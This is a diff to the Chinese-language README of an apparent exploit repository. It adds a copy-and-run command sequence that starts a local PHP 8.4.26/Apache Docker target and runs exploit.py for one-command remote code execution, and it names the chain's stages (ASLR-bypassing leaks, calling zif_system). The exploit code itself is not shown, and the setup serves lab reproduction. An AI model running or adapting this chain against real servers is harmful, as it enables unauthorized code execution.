@@ -4,9 +4,34 @@
 
 ## exp
 
-先给一键利用方式，机制解释放在后面。`exploit.py` 是一键入口：自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。
+下面是从零到 RCE 的完整命令，整段复制执行即可。本仓库不编译 PHP/Apache，没有 `docker build`：环境就是官方 `php:8.4.26-apache` 镜像加 `docker/` 下的配置挂载。
 
-环境直接用 Docker 官方镜像，不在本地编译 PHP/Apache：
+```bash
+# 依赖：Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
+git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
+cd php2shell-bypass-aslr-exp
+
+# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
+docker compose -f docker/docker-compose.yml pull
+
+# 2) 起目标：单 worker、display_errors=On、memory_limit=8M
+docker compose -f docker/docker-compose.yml up -d
+
+# 3) 等 Apache 就绪并确认普通页面
+for i in $(seq 1 20); do
+  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
+  sleep 0.5
+done
+curl -s http://127.0.0.1:8088/index.php   # OK
+
+# 4) 一条命令完成整个利用；首次运行会自动读取 libphp 偏移
+python3 exploit.py -u http://127.0.0.1:8088/index.php
+# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+> 已经在仓库目录内就跳过 `git clone`/`cd`；`pull` 也可以省略，`up -d` 会自动拉镜像。
+
+`exploit.py` 自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。运行环境：
 
 | 组件 | 版本 | 来源 |
 |---|---|---|
@@ -17,11 +42,6 @@
 | lab 报告中的 Apache | 2.4.68（原 lab 自编译） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |
 
 官方镜像仓库：[docker-library/php](https://github.com/docker-library/php)（Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)）；PHP 源码：[php/php-src](https://github.com/php/php-src)（tag `php-8.4.26`）。
-
-```bash
-docker compose -f docker/docker-compose.yml up -d
-python3 exploit.py -u http://127.0.0.1:8088/index.php
-```
 
 首次运行会自动执行 [docker/offsets.py](docker/offsets.py)：从容器内 `libphp.so` 读取 `zif_system` / `zval_ptr_dtor` 的真实偏移并写入 `out/offsets.env`，`exploit.py` 自动加载，所以更换官方镜像或升级后不用手改偏移。默认命令是 `id>/out/p1`（10 字节），容器里的 `/out` 挂载到仓库的 `./out`，proof 直接落在本机：
 
